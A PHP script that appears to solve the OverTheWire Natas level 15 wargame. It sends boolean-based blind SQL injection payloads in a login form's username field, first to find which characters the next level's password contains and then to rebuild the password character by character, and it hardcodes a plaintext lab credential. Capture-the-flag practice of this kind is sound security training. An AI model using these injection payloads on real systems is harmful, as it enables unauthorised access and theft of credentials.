<?php

# Global vars
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$chars_length = strlen($chars);

$filtered = "";
$final_pass = "";

# Connect to natas15 using PHP curl library
$handle = curl_init();

# Define connection params
$url = "http://natas15.natas.labs.overthewire.org/index.php?debug";
$username = "natas15";
$password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J";

# Loop chars
echo "Checking chars in password ...\n";
for ($i = 0; $i < $chars_length; $i++) {

    # Set the connection to natas15
    curl_setopt_array($handle,
        array(
            CURLOPT_URL               => $url,
            CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
            CURLOPT_USERPWD           => "$username:$password",
            CURLOPT_RETURNTRANSFER    => true,
            CURLOPT_POST              => 1,
            CURLOPT_POSTFIELDS        => http_build_query(array('username' => 'natas16" and password LIKE BINARY "%' . $chars[$i] . '%" #'))
        )
    );

    # Run post
    $server_output = curl_exec($handle);

    # If char is in password string ...
    if (stripos($server_output, "exists") !== false) {
        $filtered = $filtered . $chars[$i];
    }

}

# Show filtered chars
echo "Characters filtered: ". $filtered . "\n";

# Brute force to get password
echo "Using brute force to get final password ...\n";
$filtered_length = strlen($filtered);
for ($i = 0; $i < 32; $i++) {
    for ($j = 0; $j < $filtered_length; $j++) {

        # Set the connection to natas15
        curl_setopt_array($handle,
            array(
                CURLOPT_URL               => $url,
                CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
                CURLOPT_USERPWD           => "$username:$password",
                CURLOPT_RETURNTRANSFER    => true,
                CURLOPT_POST              => 1,
                CURLOPT_POSTFIELDS        => http_build_query(array('username' => 'natas16" and password LIKE BINARY "' . $final_pass . $filtered[$j] . '%" #'))
            )
        );

        # Run post
        $server_output = curl_exec($handle);

        # If char is in password string ...
        if (stripos($server_output, "exists") !== false) {
            $final_pass = $final_pass . $filtered[$j];
            echo $final_pass . "\n";
            break;
        }

    }
}

echo "Password: " . $final_pass . "\n";

# Close connection
curl_close($handle);